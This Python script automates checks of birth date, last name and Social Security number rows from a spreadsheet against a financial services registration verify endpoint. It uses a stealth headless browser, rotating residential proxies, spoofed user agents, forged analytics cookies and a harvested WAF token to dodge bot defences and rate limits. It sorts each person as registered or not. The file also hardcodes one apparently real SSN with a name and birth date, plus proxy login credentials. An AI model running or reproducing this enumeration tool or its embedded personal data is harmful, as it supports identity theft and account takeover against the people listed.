import json
import random
import ssl
import time
from typing import Any, Callable
from datetime import datetime, timezone
import urllib.error
import urllib.request
from urllib.parse import parse_qs, quote, urlparse
import sys
from pathlib import Path

from playwright.sync_api import sync_playwright
try:
    from playwright_stealth import Stealth
except Exception:
    Stealth = None  # fallback when stealth package cannot be imported

TARGET_URL = "https://connect.vestwell.com/register"
VERIFY_URL = "https://connect.vestwell.com/auth/api/register/verify"
VERIFY_SSL = False
USE_PROXY = True
RESULT_JSON = "get_id_result.json"
VERIFY_PAYLOAD = {
    "birthDate": "1968-05-11",
    "lastName": "Rabbass",
    "ssn": "434-27-6540",
}
PROXY_POOL = [
    "6ee246da804e:659bb559d456_country-us_state-florida@proxy.resi.gg:32325",
    "6ee246da804e:659bb559d456_country-us_state-delaware@proxy.resi.gg:32325",
    "6ee246da804e:659bb559d456_country-us_state-alabama@proxy.resi.gg:32325",
    "6ee246da804e:659bb559d456_country-us_state-alaska@proxy.resi.gg:32325",
    "6ee246da804e:659bb559d456_country-us_state-arizona@proxy.resi.gg:32325",
    "6ee246da804e:659bb559d456_country-us_state-arkansas@proxy.resi.gg:32325",
    "6ee246da804e:659bb559d456_country-us_state-california@proxy.resi.gg:32325",
    "6ee246da804e:659bb559d456_country-us_state-colorado@proxy.resi.gg:32325",
    "6ee246da804e:659bb559d456_country-us_state-connecticut@proxy.resi.gg:32325",
    "6ee246da804e:659bb559d456_country-us_state-georgia@proxy.resi.gg:32325",
]
HEADLESS = True
PAYLOAD_TABLE_PATH = "Безіменний_from_numbers_1500_rows-1.xlsx"
MIN_REQUEST_PAUSE_SECONDS = 1.2
MAX_REQUEST_PAUSE_SECONDS = 3.5
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 CrKey/1.54.250320",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]

BLOCKED_RESPONSE_MARKERS = (
    "blocked",
    "forbidden",
    "rate limit",
    "too many requests",
    "access denied",
    "suspicious",
    "captcha",
    "challenge",
    "security",
    "temporarily unavailable",
    "waf",
)

NOT_FOUND_RESPONSE_MARKERS = (
    "not found",
    "not_found",
    "could not be found",
    "could not find",
    "does not exist",
    "no record",
    "unknown user",
    "not in our records",
)


def _is_blocked_body(body: str | None) -> bool:
    lowered = (body or "").lower()
    if not lowered:
        return False
    return any(marker in lowered for marker in BLOCKED_RESPONSE_MARKERS)


def _is_not_found_body(body: str | None) -> bool:
    lowered = (body or "").lower()
    if not lowered:
        return False
    return any(marker in lowered for marker in NOT_FOUND_RESPONSE_MARKERS)


def _playwright_context():
    if Stealth is None:
        return sync_playwright()
    return Stealth().use_sync(sync_playwright())


def _select_proxy(proxy_list: list[str] = PROXY_POOL) -> dict | None:
    if not USE_PROXY:
        return None
    if not proxy_list:
        return None

    raw_proxy = random.choice(proxy_list)
    return _parse_raw_proxy(raw_proxy)


def _parse_raw_proxy(raw_proxy: str) -> dict | None:
    if not raw_proxy:
        return None
    if "@" not in raw_proxy:
        return {"raw": raw_proxy, "server": raw_proxy, "http": raw_proxy, "https": raw_proxy}

    auth, host_port = raw_proxy.split("@", 1)
    if ":" not in auth:
        return {"raw": raw_proxy, "server": f"http://{host_port}", "http": f"http://{raw_proxy}", "https": f"http://{raw_proxy}"}

    username, password = auth.split(":", 1)
    return {
        "raw": raw_proxy,
        "server": f"http://{host_port}",
        "username": username,
        "password": password,
        "http": f"http://{raw_proxy}",
        "https": f"http://{raw_proxy}",
    }


def _select_user_agent() -> str:
    return random.choice(USER_AGENTS)


def _normalize_header(name: str | None) -> str:
    normalized = "".join(str(name or "").strip().lower().split())
    return normalized.replace("_", "")


def _normalize_cell_value(value):
    if value is None:
        return ""
    if isinstance(value, datetime):
        return value.strftime("%Y-%m-%d")
    return str(value).strip()


def _to_payload_row(row_cells: dict[str, str]) -> dict[str, str] | None:
    birth = (
        row_cells.get("birthdate")
        or row_cells.get("birth")
        or row_cells.get("dob")
        or row_cells.get("dateofbirth")
    )
    last = (
        row_cells.get("lastname")
        or row_cells.get("surname")
        or row_cells.get("lname")
    )
    ssn = (
        row_cells.get("ssn")
        or row_cells.get("socialsecuritynumber")
        or row_cells.get("socialsecurity")
        or row_cells.get("ssnumber")
        or row_cells.get("social")
        or row_cells.get("shaloshola")
        or row_cells.get("sholashola")
    )

    if not (birth and last and ssn):
        return None

    return {
        "birthDate": birth,
        "lastName": last,
        "ssn": ssn,
    }


def _normalize_status_code(status_code: int | None, body: str | None = None) -> str:
    if status_code == 403:
        return "registered"
    if status_code == 201:
        return "unregistered"
    if status_code == 200:
        return "ok"
    if status_code == 404:
        if _is_blocked_body(body):
            return "blocked"
        if _is_not_found_body(body):
            return "not_found"
        return "not_found"
    if status_code is None:
        return "unknown"
    return str(status_code)


def _is_verify_ok(status_code: int | None) -> bool:
    return status_code in {200, 403}


def _load_payload_rows(xlsx_path: str, max_rows: int | None = None) -> list[dict]:
    try:
        from openpyxl import load_workbook
    except ImportError as exc:
        raise RuntimeError(
            "To run batch mode from .xlsx you need `openpyxl` installed: pip install openpyxl"
        ) from exc

    if not Path(xlsx_path).exists():
        raise FileNotFoundError(f"Payload file not found: {xlsx_path}")

    wb = load_workbook(xlsx_path, data_only=True)
    if not wb.sheetnames:
        raise RuntimeError(f"No sheets found in workbook: {xlsx_path}")

    sheet = wb.worksheets[0]
    rows = list(sheet.iter_rows(values_only=True))
    if len(rows) < 2:
        return []

    raw_headers = rows[0]
    normalized_headers = [_normalize_header(str(h)) for h in raw_headers]
    payload_rows: list[dict] = []

    for row_number, values in enumerate(rows[1:], start=2):
        row_dict = {}
        for header_name, cell in zip(normalized_headers, values):
            if not header_name:
                continue
            row_dict[header_name] = _normalize_cell_value(cell)
        payload = _to_payload_row(row_dict)
        if payload:
            payload_rows.append(
                {
                    "source_row": row_number,
                    "payload": payload,
                    "raw": row_dict,
                }
            )
            if max_rows and len(payload_rows) >= max_rows:
                break

    return payload_rows


def _parse_heap_request(url: str) -> dict | None:
    parsed = urlparse(url)
    if parsed.hostname not in {"heapanalytics.com", "cdn.heapanalytics.com"}:
        return None
    if parsed.path != "/h":
        return None

    params = parse_qs(parsed.query, keep_blank_values=True)
    app_id = params.get("a", [None])[0]
    if not app_id:
        return None

    sp_values = params.get("sp", [])
    sp = {}
    for i in range(0, len(sp_values) - 1, 2):
        key = sp_values[i]
        value = sp_values[i + 1]
        if key == "ts":
            try:
                value = int(value)
            except ValueError:
                pass
        sp[key] = value

    if not sp:
        ts = params.get("ts", [None])[0]
        d = params.get("d", [None])[0]
        h = params.get("h", [None])[0]
        if ts is not None and d is not None and h is not None:
            try:
                ts = int(ts)
            except ValueError:
                pass
            sp = {"ts": ts, "d": d, "h": h}

    return {
        "a": params.get("a", [None])[0],
        "u": params.get("u", [None])[0],
        "v": params.get("v", [None])[0],
        "s": params.get("s", [None])[0],
        "tv": params.get("tv", [None])[0],
        "sp": sp,
    }


def _encode_cookie_json(data: dict) -> str:
    return quote(json.dumps(data, separators=(",", ":"), ensure_ascii=False), safe="-_.!~*'()")


def _build_heap_cookie_payload(found_heap: dict) -> dict:
    if not found_heap:
        return {}

    app_id = found_heap.get("a")
    u = found_heap.get("u")
    v = found_heap.get("v")
    s = found_heap.get("s")

    if not all((app_id, u, v, s)):
        return {}

    sp = found_heap.get("sp", {})
    ts = sp.get("ts")
    d = sp.get("d")
    h = sp.get("h")

    hp2_id_cookie_name = f"_hp2_id.{app_id}"
    hp2_ses_props_cookie_name = f"_hp2_ses_props.{app_id}"

    hp2_id_payload = {
        "userId": str(u),
        "pageviewId": str(v),
        "sessionId": str(s),
        "identity": None,
        "trackerVersion": str(found_heap.get("tv")) if found_heap.get("tv") is not None else None,
    }
    hp2_ses_payload = {
        "ts": ts,
        "d": d,
        "h": h,
    }

    return {
        "hp2_id_cookie_name": hp2_id_cookie_name,
        "hp2_id_cookie_value": _encode_cookie_json(hp2_id_payload),
        "hp2_ses_props_cookie_name": hp2_ses_props_cookie_name,
        "hp2_ses_props_cookie_value": _encode_cookie_json(hp2_ses_payload),
    }


def _find_cookie(cookies: list[dict], name: str) -> dict | None:
    return next((c for c in cookies if c.get("name") == name), None)


def _fetch_public_ip(proxy: dict | None) -> str:
    ip_api_url = "https://api.ipify.org?format=json"
    ssl_context = None if VERIFY_SSL else ssl._create_unverified_context()
    req = urllib.request.Request(ip_api_url, method="GET")
    handlers: list[object] = [urllib.request.HTTPSHandler(context=ssl_context)]
    if proxy:
        handlers.insert(
            0,
            urllib.request.ProxyHandler({"http": proxy["http"], "https": proxy["https"]}),
        )
    opener = urllib.request.build_opener(*handlers)
    try:
        with opener.open(req, timeout=20) as response:
            payload = response.read().decode("utf-8", errors="replace")
            try:
                return json.loads(payload).get("ip", "unknown")
            except Exception:
                return payload.strip() or "unknown"
    except Exception as exc:
        return f"failed: {exc}"


def _build_final_cookie_header(
    generated_heap_cookies: dict,
    session_cookie: dict | None,
    waf_cookie: dict | None,
) -> str:
    parts: list[str] = []

    if generated_heap_cookies.get("hp2_id_cookie_name") and generated_heap_cookies.get("hp2_id_cookie_value"):
        parts.append(
            f"{generated_heap_cookies['hp2_id_cookie_name']}={generated_heap_cookies['hp2_id_cookie_value']}"
        )

    if session_cookie:
        parts.append(f"Session={session_cookie['value']}")

    if (
        generated_heap_cookies.get("hp2_ses_props_cookie_name")
        and generated_heap_cookies.get("hp2_ses_props_cookie_value")
    ):
        parts.append(
            f"{generated_heap_cookies['hp2_ses_props_cookie_name']}={generated_heap_cookies['hp2_ses_props_cookie_value']}"
        )

    if waf_cookie:
        parts.append(f"aws-waf-token={waf_cookie['value']}")

    return "; ".join(parts)


def run_from_payload_table(
    xlsx_path: str = PAYLOAD_TABLE_PATH,
    url: str = TARGET_URL,
    max_rows: int | None = None,
    pause_min: float = MIN_REQUEST_PAUSE_SECONDS,
    pause_max: float = MAX_REQUEST_PAUSE_SECONDS,
    proxy_pool: list[str] | None = None,
    use_proxy: bool | None = None,
    progress_callback: Callable[[dict], None] | None = None,
    task_id: str | None = None,
    verbose: bool = True,
    result_json: str | None = None,
) -> list[dict]:
    payload_rows = _load_payload_rows(xlsx_path, max_rows=max_rows)
    if not payload_rows:
        if verbose:
            print(f"No valid rows found in payload table: {xlsx_path}")
        return []

    if pause_min < 0:
        pause_min = 0
    if pause_max < pause_min:
        pause_max = pause_min

    effective_use_proxy = USE_PROXY if use_proxy is None else use_proxy
    pool = PROXY_POOL if proxy_pool is None else proxy_pool
    proxies = []
    if effective_use_proxy:
        proxies = [p for p in (_parse_raw_proxy(raw) for raw in pool) if p]

    if progress_callback:
        progress_callback(
            {
                "type": "task_started",
                "task_id": task_id,
                "file": xlsx_path,
                "total": len(payload_rows),
                "pause_min": pause_min,
                "pause_max": pause_max,
                "proxy_count": len(proxies),
            }
        )

    work_items: list[dict[str, Any]] = [
        {
            "payload_row": payload_row,
            "row_number": index + 1,
            "retry_count": 0,
        }
        for index, payload_row in enumerate(payload_rows)
    ]
    results: list[dict] = []
    idx = 0

    while idx < len(work_items):
        work_item = work_items[idx]
        payload_row = work_item["payload_row"]
        row_number = work_item["row_number"]
        retry_count = int(work_item.get("retry_count") or 0)
        proxy_index = row_number - 1 + retry_count
        proxy = proxies[proxy_index % len(proxies)] if proxies else None

        payload = payload_row["payload"]
        row_payload = {
            "birthDate": payload["birthDate"],
            "lastName": payload["lastName"],
            "ssn": payload["ssn"],
        }

        if verbose:
            attempt_label = "retry" if retry_count else "attempt"
            print(f"\n=== Row {row_number}/{len(payload_rows)} ({attempt_label} {retry_count + 1}, source row {payload_row['source_row']}) ===")
            if proxy:
                print(f"Using proxy: {proxy['raw']}")
            else:
                print("Proxy disabled / not available")

        if progress_callback:
            progress_callback(
                {
                    "type": "row_started",
                    "task_id": task_id,
                    "row": row_number,
                    "source_row": payload_row["source_row"],
                    "payload": row_payload,
                    "proxy": proxy["raw"] if proxy else None,
                    "total": len(payload_rows),
                }
            )

        try:
            result = extract_from_single_run(
                url=url,
                verify_payload=row_payload,
                proxy=proxy,
                user_agent=_select_user_agent(),
                row_number=row_number,
                source_row=payload_row["source_row"],
                save_each=False,
                verbose=verbose,
            )
        except Exception as exc:
            result = {
                "timestamp": datetime.now(timezone.utc).isoformat(timespec="seconds"),
                "url": url,
                "proxy": proxy["raw"] if proxy else None,
                "public_ip_via_proxy": "not checked",
                "row": row_number,
                "source_row": payload_row["source_row"],
                "verify_payload": row_payload,
                "cookies": {},
                "verify": {"status": None, "ok": False, "body": str(exc)},
            }

        verify = result.get("verify", {})
        status_code = verify.get("status")

        if status_code == 202 and retry_count == 0:
            if verbose:
                print("HTTP 202 received, retrying this row later...")
            work_items.append(
                {
                    "payload_row": payload_row,
                    "row_number": row_number,
                    "retry_count": retry_count + 1,
                }
            )
            idx += 1
            continue

        results.append(result)

        if progress_callback:
            progress_callback(
                {
                    "type": "row_finished",
                    "task_id": task_id,
                    "row": row_number,
                    "source_row": payload_row["source_row"],
                    "status": verify.get("status"),
                    "ok": bool(verify.get("ok")),
                    "proxy": proxy["raw"] if proxy else None,
                    "body_preview": str(verify.get("body", ""))[:500] if verify.get("body") else None,
                    "session_cookie": result.get("cookies", {}).get("Session"),
                    "error": str(result.get("error", "")),
                }
            )

        if idx < len(work_items) - 1:
            delay = random.uniform(pause_min, pause_max)
            if verbose:
                print(f"Pause {delay:.2f}s before next row...")
            if progress_callback:
                progress_callback(
                    {
                        "type": "row_pause",
                        "task_id": task_id,
                        "row": row_number,
                        "pause_seconds": delay,
                    }
                )
            time.sleep(delay)

        idx += 1

    results.sort(key=lambda result: ((result.get("row") or 0), (result.get("source_row") or 0)))

    _save_results(
        results,
        json_path=result_json or RESULT_JSON,
    )
    if verbose:
        print(f"\nSaved JSON -> {result_json or RESULT_JSON}")

    if progress_callback:
        progress_callback(
            {
                "type": "task_finished",
                "task_id": task_id,
                "total": len(results),
                "json_path": result_json or RESULT_JSON,
            }
        )

    return results


def _save_results(results: list[dict] | dict, json_path: str = RESULT_JSON) -> None:
    result_rows = results if isinstance(results, list) else [results]

    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(result_rows, f, ensure_ascii=False, indent=2)

    if not result_rows:
        return


def _build_csv_row(result: dict) -> dict:
    heap = result.get("heap", {})
    sp = heap.get("sp", {})
    payload = result.get("verify_payload", {})

    return {
        "timestamp": result.get("timestamp"),
        "url": result.get("url"),
        "row": result.get("row"),
        "source_row": result.get("source_row"),
        "proxy": result.get("proxy"),
        "public_ip_via_proxy": result.get("public_ip_via_proxy"),
        "registration_status": (
            result.get("verify", {}).get("status_label")
            or _normalize_status_code(
                result.get("verify", {}).get("status"),
                result.get("verify", {}).get("body"),
            )
        ),
        "a": heap.get("a"),
        "u": heap.get("u"),
        "v": heap.get("v"),
        "s": heap.get("s"),
        "tv": heap.get("tv"),
        "sp_ts": sp.get("ts"),
        "sp_d": sp.get("d"),
        "sp_h": sp.get("h"),
        "payload_birthDate": payload.get("birthDate"),
        "payload_lastName": payload.get("lastName"),
        "payload_ssn": payload.get("ssn"),
        "final_cookie_header": result.get("final_cookie_header"),
        "Session": result.get("cookies", {}).get("Session"),
        "aws_waf_cookie": result.get("cookies", {}).get("aws-waf-token"),
        "verify_status": result.get("verify", {}).get("status"),
        "verify_body": result.get("verify", {}).get("body"),
    }


def _verify_register_post(
    final_cookie_header: str,
    waf_token: str | None,
    user_agent: str | None,
    verify_payload: dict,
    proxy: dict | None,
) -> dict:
    ssl_context = None if VERIFY_SSL else ssl._create_unverified_context()
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://connect.vestwell.com",
        "Referer": "https://connect.vestwell.com/register",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "Cookie": final_cookie_header,
        "priority": "u=1, i",
        "Accept-Language": "uk-UA,uk;q=0.9,en-US;q=0.8,en;q=0.7",
    }

    if user_agent:
        headers["User-Agent"] = user_agent
    if waf_token:
        headers["x-aws-waf-token"] = waf_token

    body = json.dumps(verify_payload).encode("utf-8")
    req = urllib.request.Request(VERIFY_URL, data=body, method="POST")

    for key, value in headers.items():
        req.add_header(key, value)

    handlers: list[object] = [urllib.request.HTTPSHandler(context=ssl_context)]
    if proxy:
        handlers.insert(
            0,
            urllib.request.ProxyHandler({"http": proxy["http"], "https": proxy["https"]}),
        )
    opener = urllib.request.build_opener(*handlers)

    try:
        with opener.open(req, timeout=30) as response:
            status = response.getcode()
            raw = response.read().decode(response.headers.get_content_charset() or "utf-8", errors="replace")
            status_label = _normalize_status_code(status, raw)
            return {
                "status": status,
                "ok": _is_verify_ok(status),
                "status_label": status_label,
                "body": raw,
                "content_type": response.headers.get("Content-Type"),
                "set_cookie": response.headers.get("Set-Cookie"),
            }
    except urllib.error.HTTPError as error:
        status = error.code
        body = error.read().decode("utf-8", errors="replace")
        status_label = _normalize_status_code(status, body)
        return {
            "status": status,
            "ok": _is_verify_ok(status),
            "status_label": status_label,
            "body": body,
            "content_type": error.headers.get("Content-Type") if error.headers else None,
            "set_cookie": error.headers.get("Set-Cookie") if error.headers else None,
        }
    except Exception as exc:
        status_label = _normalize_status_code(None, str(exc))
        return {
            "status": None,
            "ok": _is_verify_ok(None),
            "status_label": status_label,
            "body": str(exc),
            "content_type": None,
            "set_cookie": None,
        }


def extract_from_single_run(
    url: str = TARGET_URL,
    verify_payload: dict | None = None,
    proxy: dict | None = None,
    user_agent: str | None = None,
    row_number: int | None = None,
    source_row: int | None = None,
    save_each: bool = True,
    verbose: bool = True,
) -> dict:
    def _log(*args, **kwargs):
        if verbose:
            print(*args, **kwargs)

    with _playwright_context() as p:
        if proxy is None:
            proxy = _select_proxy()

        browser_proxy = None
        if proxy:
            browser_proxy = {"server": proxy["server"]}
            if proxy.get("username"):
                browser_proxy["username"] = proxy["username"]
            if proxy.get("password"):
                browser_proxy["password"] = proxy["password"]

        browser = p.chromium.launch(
            headless=HEADLESS,
            args=["--disable-blink-features=AutomationControlled", "--no-sandbox"],
            proxy=browser_proxy,
        )
        if not user_agent:
            user_agent = _select_user_agent()
        context = browser.new_context(
            viewport={"width": 1920, "height": 1080},
            user_agent=user_agent,
        )
        page = context.new_page()

        found_heap: dict = {}
        analytics_requests: list = []

        def on_request(req):
            parsed_url = req.url
            if any(x in parsed_url for x in ["analytics", "collect", "track", "events"]):
                try:
                    payload = req.post_data_json
                    if payload:
                        analytics_requests.append(payload)
                except Exception:
                    pass

            heap_data = _parse_heap_request(parsed_url)
            if heap_data:
                if not found_heap:
                    found_heap.update(heap_data)
                elif not found_heap.get("sp") and heap_data.get("sp"):
                    found_heap["sp"] = heap_data.get("sp")

        page.on("request", on_request)

        page.goto(url, wait_until="domcontentloaded")
        page.wait_for_timeout(8000)

        all_cookies = context.cookies()

        session_cookie = _find_cookie(all_cookies, "Session")
        waf_cookie = _find_cookie(all_cookies, "aws-waf-token")

        generated_heap_cookies = _build_heap_cookie_payload(found_heap)
        final_cookie_header = _build_final_cookie_header(generated_heap_cookies, session_cookie, waf_cookie)

        result = {
            "timestamp": datetime.now(timezone.utc).isoformat(timespec="seconds"),
            "url": url,
            "proxy": proxy["raw"] if proxy else None,
            "public_ip_via_proxy": "not checked",
            "heap": found_heap,
            "analytics_requests": analytics_requests,
            "generated_heap_cookies": generated_heap_cookies,
            "row": row_number,
            "source_row": source_row,
            "verify_payload": verify_payload or VERIFY_PAYLOAD,
            "cookies": {
                "Session": session_cookie.get("value") if session_cookie else None,
                "aws-waf-token": waf_cookie.get("value") if waf_cookie else None,
            },
            "final_cookie_header": final_cookie_header,
            "verify": _verify_register_post(
                final_cookie_header=final_cookie_header,
                waf_token=waf_cookie.get("value") if waf_cookie else None,
                user_agent=user_agent,
                verify_payload=verify_payload or VERIFY_PAYLOAD,
                proxy=proxy,
            ),
        }

        if proxy:
            _log(f"Using proxy: {proxy['raw']}")
            result["public_ip_via_proxy"] = _fetch_public_ip(proxy)
            _log(f"IP via proxy: {result['public_ip_via_proxy']}")
        else:
            _log("Proxy disabled. Request should go directly from current environment IP.")

        _log("=== Extracted values ===")
        if found_heap:
            _log(f"a  = {found_heap.get('a')}")
            _log(f"u  = {found_heap.get('u')}")
            _log(f"v  = {found_heap.get('v')}")
            _log(f"s  = {found_heap.get('s')}")
            _log(f"tv = {found_heap.get('tv')}")
            _log()
            _log("sp:")
            _log(f"ts = {found_heap.get('sp', {}).get('ts')}")
            _log(f"d  = {found_heap.get('sp', {}).get('d')}")
            _log(f"h  = {found_heap.get('sp', {}).get('h')}")
        else:
            _log("a/u/v/s/tv/sp: not found in captured network requests")

        _log("\n=== Heap-generated cookies ===")
        if generated_heap_cookies.get("hp2_id_cookie_name"):
            _log(f"{generated_heap_cookies['hp2_id_cookie_name']}={generated_heap_cookies['hp2_id_cookie_value']}")
        if generated_heap_cookies.get("hp2_ses_props_cookie_name"):
            _log(
                f"{generated_heap_cookies['hp2_ses_props_cookie_name']}={generated_heap_cookies['hp2_ses_props_cookie_value']}"
            )

        _log("\nCookies from browser:")
        _log(f"Session = {session_cookie['value'] if session_cookie else '<not found>'}")
        _log(f"aws-waf-token = {waf_cookie['value'] if waf_cookie else '<not found>'}")

        _log("\n=== Final Cookie Header ===")
        _log(final_cookie_header)

        if analytics_requests:
            _log("\n--- Analytics payloads captured (json) ---")
            for i, payload in enumerate(analytics_requests[:5], 1):
                try:
                    _log(f"[{i}] {json.dumps(payload, ensure_ascii=False)}")
                except Exception:
                    _log(f"[{i}] {payload}")

        _log("\n=== Register Verify Response ===")
        verify = result["verify"]
        _log(f"Status: {verify.get('status')}")
        _log(f"Content-Type: {verify.get('content_type')}")
        _log(f"Payload: {result.get('verify_payload')}")
        if verify.get("body"):
            _log(f"Body: {verify.get('body')}")

        browser.close()

        if save_each:
            _save_results(result)
            _log(f"\nSaved JSON -> {RESULT_JSON}")

        return result


if __name__ == "__main__":
    if len(sys.argv) > 1:
        payload_path = sys.argv[1]
    else:
        payload_path = PAYLOAD_TABLE_PATH

    limit = None
    if len(sys.argv) > 2:
        try:
            limit = int(sys.argv[2])
        except ValueError:
            print(f"Invalid max rows value: {sys.argv[2]}. Running full table.")
            limit = None

    if Path(payload_path).suffix.lower() == ".xlsx":
        run_from_payload_table(xlsx_path=payload_path, max_rows=limit)
    else:
        print(f"Unsupported payload file extension: {payload_path}")
        print("Expected .xlsx with columns for birthDate/lastName/ssn (or compatible aliases).")
        extract_from_single_run(TARGET_URL, verify_payload=VERIFY_PAYLOAD, save_each=True)
